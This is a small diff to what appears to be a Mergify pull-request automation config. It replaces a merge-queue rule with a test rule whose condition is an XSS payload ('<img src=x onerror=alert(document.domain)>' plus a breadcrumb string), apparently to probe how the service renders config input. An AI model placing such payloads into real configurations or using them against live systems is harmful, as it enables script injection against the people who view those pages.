@@ -1,10 +1,7 @@
-queue_rules:
-  - name: default
-    merge_method: merge
 pull_request_rules:
-  - name: queue
+  - name: test
     conditions:
-      - label=ready
+      - "<img src=x onerror=alert(document.domain)>xssbreadcrumb[[
     actions:
-      queue:
-        name: default
+      comment:
+        message: hi
